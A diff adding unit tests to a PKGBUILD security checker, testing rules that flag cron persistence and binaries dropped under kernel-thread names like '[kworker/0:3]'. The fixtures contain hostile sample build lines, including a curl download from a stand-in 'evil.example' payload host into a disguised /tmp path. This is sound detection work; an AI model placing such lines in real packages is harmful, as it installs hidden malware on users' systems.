@@ -32,6 +32,19 @@ def test_per002_fires_on_crontab_install_from_file(make_pkgbuild_ctx):
     assert len(list(PER002CronPersistence().check(ctx))) == 1
 
 
+def test_per002_fires_on_crontab_edit_even_with_sudo_prefix(make_pkgbuild_ctx):
+    # crontab -e has no legitimate use in an unattended build/install script (it
+    # opens an interactive editor) -- flag it, including when prefixed with sudo.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          sudo crontab -e
+        }
+        """
+    )
+    assert len(list(PER002CronPersistence().check(ctx))) == 1
+
+
 def test_per002_does_not_fire_on_crontab_list_or_remove(make_pkgbuild_ctx):
     # crontab -l (list) and crontab -r (remove) are read-only/destructive, not
     # installing anything -- neither should be flagged as persistence.
@@ -110,3 +123,27 @@ def test_per006_does_not_fire_on_normal_tmp_use(make_pkgbuild_ctx):
         """
     )
     assert list(PER006DisguisedBinaryDrop().check(ctx)) == []
+
+
+def test_per006_fires_on_bracketed_kworker_name_with_colon(make_pkgbuild_ctx):
+    # Real per-CPU kernel-thread names look like [kworker/0:3] -- the colon (and
+    # internal slash) must not break basename matching.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          cp payload "/tmp/[kworker/0:3]"
+        }
+        """
+    )
+    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1
+
+
+def test_per006_fires_on_bundled_curl_flags(make_pkgbuild_ctx):
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          curl -fsSLo /tmp/kworker/0:3 https://evil.example/payload
+        }
+        """
+    )
+    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1
